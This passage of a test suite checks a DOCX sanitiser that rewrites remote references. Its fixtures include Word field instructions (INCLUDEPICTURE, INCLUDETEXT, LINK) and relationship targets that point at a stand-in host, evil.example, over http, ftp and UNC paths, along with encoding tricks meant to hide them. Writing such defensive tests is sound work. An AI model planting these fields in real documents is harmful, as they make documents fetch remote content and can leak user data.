    const odd = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('<w:p/>', 'utf16le'), Buffer.from([0x20])]);
    expect(() => neutraliseReferences(buildDocx({ extra: { 'word/header1.xml': odd } }))).toThrow(/E_SECURITY.*not valid UTF-16/);
    const broken = utf16(documentXml(`<w:p>${complexField([' INCLUDEPICTURE "http://evil.example/x.png"'])}</w:p>`).replace('</w:body>', ''), 'le', true);
    expect(() => neutraliseReferences(buildDocx({ extra: { 'word/header1.xml': broken } }))).toThrow(/E_SECURITY.*not well-formed/);
  });
  it('two parts with the same name (the renderer could read the one we did not)', () => {
    const entry = (name: string, text: string) => ({ name, data: Buffer.from(text) });
    const zip = rawZip([
      entry('[Content_Types].xml', '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'),
      entry('word/document.xml', documentXml('<w:p/>')),
      entry('Word/Document.xml', documentXml('<w:p/>')),
    ]);
    expect(() => neutraliseReferences(zip)).toThrow(/same name/);
  });
  it('allowed mode reports a failure instead of throwing at the renderer: the caller decides', () => {
    expect(() => analyseReferences(Buffer.from('nope'), { mutate: false })).toThrow();
  });
});

describe('allowNetworkReferences option parsing', () => {
  it('accepts booleans and the usual spellings, and empty means unset', () => {
    for (const v of [true, '1', 'true', 'YES', ' on ']) expect(parseAllowNetworkReferences(v)).toBe(true);
    for (const v of [false, '0', 'false', 'No', 'off']) expect(parseAllowNetworkReferences(v)).toBe(false);
    expect(parseAllowNetworkReferences('')).toBeUndefined();
    expect(parseAllowNetworkReferences(undefined)).toBeUndefined();
  });
  it('rejects anything else, naming the variable', () => {
    expect(() => parseAllowNetworkReferences('maybe', 'ASTRA_ALLOW_NETWORK_REFERENCES')).toThrow(/ASTRA_ALLOW_NETWORK_REFERENCES/);
    expect(() => parseAllowNetworkReferences(2 as unknown as boolean)).toThrow(/true or false/);
  });
  it('an explicit per-call value, including false, beats the environment', () => {
    expect(effectiveAllowNetworkReferences(undefined, {})).toBe(false);
    expect(effectiveAllowNetworkReferences(undefined, { ASTRA_ALLOW_NETWORK_REFERENCES: '1' })).toBe(true);
    expect(effectiveAllowNetworkReferences(false, { ASTRA_ALLOW_NETWORK_REFERENCES: '1' })).toBe(false);
    expect(effectiveAllowNetworkReferences(true, { ASTRA_ALLOW_NETWORK_REFERENCES: '0' })).toBe(true);
    expect(() => effectiveAllowNetworkReferences(undefined, { ASTRA_ALLOW_NETWORK_REFERENCES: 'x' })).toThrow(/ASTRA_ALLOW_NETWORK_REFERENCES/);
    expect(effectiveAllowNetworkReferences(false, { ASTRA_ALLOW_NETWORK_REFERENCES: 'x' })).toBe(false);
  });
});

describe('redaction: no unusual target reaches a report', () => {
  const targets = [
    'HTTP://U:P@Host/%2e%2e?x=1#f',
    '\\\\host\\share\\a b',
    '//host/x',
    'file://host/x',
    'h\tttp://x',
    'http://xn--bcher-kva.example/ü',
    'ünknown://secret-host/path',
    `http://secret-host/${'a'.repeat(10000)}`,
    'http://secret-host/\u0000x',
    '\\\\?\\GLOBALROOT\\secret-device',
  ];
  it.each(targets)('does not print %j anywhere', (t) => {
    // eslint-disable-next-line no-control-regex -- the test strips control characters on purpose
    const escaped = t.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;').replace(/[\u0000-\u0008]/g, '');
    const a = neutraliseReferences(buildDocx({ rels: [{ id: 'rId1', type: 'image', target: escaped, mode: 'External' }] }));
    const text = JSON.stringify([a.found, buildReferenceReport(false, a), describeReferenceReport(buildReferenceReport(false, a))]);
    for (const leak of ['secret', 'Host', 'host', 'U:P', 'x=1', '%2e', 'xn--', 'bcher', 'share', 'a b']) {
      expect(text).not.toContain(leak);
    }
  });
});

describe('UTF-16 parts (valid documents that Word and other tools write)', () => {
  const custom = '<?xml version="1.0" encoding="UTF-16"?><b:Sources xmlns:b="http://schemas.openxmlformats.org/officeDocument/2006/bibliography"><b:Source><b:Title>Grüße</b:Title></b:Source></b:Sources>';
  const variants: Array<['le' | 'be', boolean]> = [
    ['le', true],
    ['be', true],
    ['le', false],
    ['be', false],
  ];

  it.each(variants)('a UTF-16 %s (BOM: %s) part with no reference leaves the package untouched', (endian, bom) => {
    const docx = buildDocx({ extra: { 'customXml/item1.xml': utf16(custom, endian, bom), 'word/header1.xml': utf16(documentXml('<w:p/>'), endian, bom) } });
    const a = neutraliseReferences(docx);
    expect(a.docx).toBe(docx);
    expect(a.found).toHaveLength(0);
  });

  it.each(variants)('a UTF-16 %s (BOM: %s) part with a network field is neutralised and stays UTF-16', (endian, bom) => {
    const header = documentXml(`<w:p>${complexField([' INCLUDEPICTURE "http://evil.example/x.png"'])}<w:r><w:t>Grüße</w:t></w:r></w:p>`);
    const docx = buildDocx({ extra: { 'word/header1.xml': utf16(header, endian, bom) } });
    const a = neutraliseReferences(docx);
    expect(a.found).toHaveLength(1);
    const out = rawPart(a.docx, 'word/header1.xml');
    expect(out.subarray(0, 2).equals(Buffer.from(bom ? (endian === 'le' ? [0xff, 0xfe] : [0xfe, 0xff]) : endian === 'le' ? [0x3c, 0x00] : [0x00, 0x3c]))).toBe(true);
    const text = fromUtf16(out, endian);
    expect(text).not.toContain('evil.example');
    expect(text).toContain('Grüße');
    const problems: string[] = [];
    new DOMParserForTest({ errorHandler: { warning: (m: string) => problems.push(m), error: (m: string) => problems.push(m), fatalError: (m: string) => problems.push(m) } }).parseFromString(text, 'text/xml');
    expect(problems).toEqual([]);
  });

  it.each(variants)('a UTF-16 %s (BOM: %s) relationships part with an external target is retargeted', (endian, bom) => {
    const rels = relsXml([{ id: 'rId1', type: 'image', target: 'http://evil.example/p.png', mode: 'External' }]).replace('encoding="UTF-8"', 'encoding="UTF-16"');
    const docx = buildDocx({ extra: { 'word/_rels/header1.xml.rels': utf16(rels, endian, bom) } });
    const a = neutraliseReferences(docx);
    expect(a.found).toHaveLength(1);
    const text = fromUtf16(rawPart(a.docx, 'word/_rels/header1.xml.rels'), endian);
    expect(text).not.toContain('evil.example');
    expect(text).toContain(INERT_TARGET);
  });

  it('a binary part that only starts with a UTF-16 byte order mark is left alone', () => {
    const docx = buildDocx({ extra: { 'word/embeddings/o.bin': Buffer.from([0xff, 0xfe, 0x01, 0x02, 0x03]), 'word/fonts/f.odttf': Buffer.from([0xfe, 0xff, 0x00]) } });
    expect(neutraliseReferences(docx).docx).toBe(docx);
  });
});

describe('size limits', () => {
  it('a highly compressible part (a blank bitmap) is not a reason to refuse: the ratio is an opening policy, not a scan limit', () => {
    const blank = Buffer.alloc(2 * 1024 * 1024, 0);
    const docx = buildDocx({ extra: { 'word/media/image1.bmp': blank } });
    expect(() => neutraliseReferences(docx)).not.toThrow();
  });
  it('the total uncompressed ceiling still applies', () => {
    const prev = process.env.ASTRA_MAX_UNCOMPRESSED_BYTES;
    process.env.ASTRA_MAX_UNCOMPRESSED_BYTES = '1000';
    try {
      expect(() => neutraliseReferences(buildDocx({ extra: { 'word/media/image1.bmp': Buffer.alloc(4096, 1) } }))).toThrow(/E_LIMIT/);
    } finally {
      if (prev === undefined) delete process.env.ASTRA_MAX_UNCOMPRESSED_BYTES;
      else process.env.ASTRA_MAX_UNCOMPRESSED_BYTES = prev;
    }
  });
});

describe('XML white space before the first tag', () => {
  const field = `<w:p>${complexField([' INCLUDEPICTURE "http://evil.example/x.png"'])}</w:p>`;
  const variants: Array<['le' | 'be', boolean]> = [
    ['le', true],
    ['be', true],
    ['le', false],
    ['be', false],
  ];
  const withSpace = (xml: string, space: string) => space + xml;
  const noDecl = (body: string) => documentXml(body).replace(/^<\?xml[^>]*\?>/, '');

  it.each(variants)('UTF-16 %s (BOM: %s): a field after a newline is found and neutralised, with or without an XML declaration', (endian, bom) => {
    for (const xml of [noDecl(field), documentXml(field)]) {
      for (const space of ['\n', '\r\n  \t', ' '.repeat(300)]) {
        const docx = buildDocx({ extra: { 'word/header1.xml': utf16(withSpace(xml, space), endian, bom) } });
        const a = neutraliseReferences(docx);
        expect(a.found, JSON.stringify(space)).toHaveLength(1);
        expect(a.changed).toBe(true);
        const out = fromUtf16(rawPart(a.docx, 'word/header1.xml'), endian);
        expect(out).toContain('w:document'); // the part decoded as XML
        expect(out).not.toContain('evil.example');
      }
    }
  });

  it.each(variants)('UTF-16 %s (BOM: %s): a relationship part after a newline is retargeted', (endian, bom) => {
    const rels = '\n' + relsXml([{ id: 'rId1', type: 'image', target: 'http://evil.example/p.png', mode: 'External' }]);
    const docx = buildDocx({ extra: { 'word/_rels/header1.xml.rels': utf16(rels, endian, bom) } });
    const a = neutraliseReferences(docx);
    expect(a.found).toHaveLength(1);
    expect(fromUtf16(rawPart(a.docx, 'word/_rels/header1.xml.rels'), endian)).not.toContain('evil.example');
  });

  it('UTF-8: more than 64 bytes of white space before the root element does not hide a field', () => {
    const docx = buildDocx({ extra: { 'word/header1.xml': Buffer.from(' '.repeat(500) + noDecl(field)) } });
    const a = neutraliseReferences(docx);
    expect(a.found).toHaveLength(1);
    expect(readPart(a.docx, 'word/header1.xml')).not.toContain('evil.example');
  });

  it('an .xml part in an encoding that cannot be read (UTF-32) fails closed; other names are left alone', () => {
    const utf32 = Buffer.alloc((noDecl(field).length + 1) * 4);
    const text = '\ufeff' + noDecl(field);
    for (let i = 0; i < text.length; i++) utf32.writeUInt32LE(text.charCodeAt(i), i * 4);
    expect(() => neutraliseReferences(buildDocx({ extra: { 'word/header1.xml': utf32 } }))).toThrow(/E_SECURITY.*not UTF-8 or UTF-16/);
    const docx = buildDocx({ extra: { 'word/embeddings/o.bin': utf32 } });
    expect(neutraliseReferences(docx).docx).toBe(docx);
  });

  it('an odd-length .xml part that looks like UTF-16 fails closed; a binary part with that start does not', () => {
    const odd = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('\n<w:p/>', 'utf16le'), Buffer.from([0x20])]);
    expect(() => neutraliseReferences(buildDocx({ extra: { 'word/header1.xml': odd } }))).toThrow(/E_SECURITY/);
    const docx = buildDocx({ extra: { 'word/embeddings/o.bin': odd } });
    expect(neutraliseReferences(docx).docx).toBe(docx);
  });
});

describe('field switches that take an argument', () => {
  it.each([
    ' INCLUDETEXT \\c "HTML" "http://evil.example/file"',
    ' INCLUDETEXT \\c HTML http://evil.example/file',
    ' INCLUDETEXT \\c "HTML" "\\\\\\\\evil.example\\\\share\\\\f.docx" bookmark',
    ' INCLUDEPICTURE \\c "jpegfilt" "http://evil.example/a.jpg" \\d',
    ' INCLUDEPICTURE \\x \\y \\c png "ftp://evil.example/a.png"',
    ' LINK Excel.Sheet.12 \\f 0 \\a "http://evil.example/a.xlsx" "Sheet1!R1C1"',
    ' IMPORT \\c GIF "http://evil.example/a.gif"',
  ])('the network target is found wherever it sits among the arguments: %s', (instruction) => {
    const v = inspectFieldInstruction(instruction);
    expect(v?.class).toBe('network');
    expect(v?.rewritten).toBeDefined();
    expect(v?.rewritten).not.toContain('evil.example');
    expect(v?.rewritten).toContain(INERT_TARGET);
  });

  it('a converter name and a bookmark stay as they are; only the target is retargeted', () => {
    const v = inspectFieldInstruction(' INCLUDETEXT \\c "HTML" "http://evil.example/f" mark1');
    expect(v?.rewritten).toContain('\\c "HTML"');
    expect(v?.rewritten).toContain('mark1');
    expect(inspectFieldInstruction(' INCLUDETEXT \\c "HTML" "C:\\\\docs\\\\f.html" mark1')?.class).toBe('local');
  });

  it('two targets in one field are both retargeted', () => {
    const v = inspectFieldInstruction(' INCLUDETEXT "http://evil.example/a" "http://other.example/b"');
    expect(v?.rewritten).not.toContain('evil.example');
    expect(v?.rewritten).not.toContain('other.example');
  });

  it('a complete package: a field with a switch argument is neutralised in the document body', () => {
    const body = `<w:p>${complexField([' INCLUDETEXT \\c "HTML" ', '"http://evil.example/file"'])}</w:p>`;
    const a = neutraliseReferences(buildDocx({ body }));
    expect(a.found).toHaveLength(1);
    expect(readPart(a.docx, 'word/document.xml')).not.toContain('evil.example');
  });
});
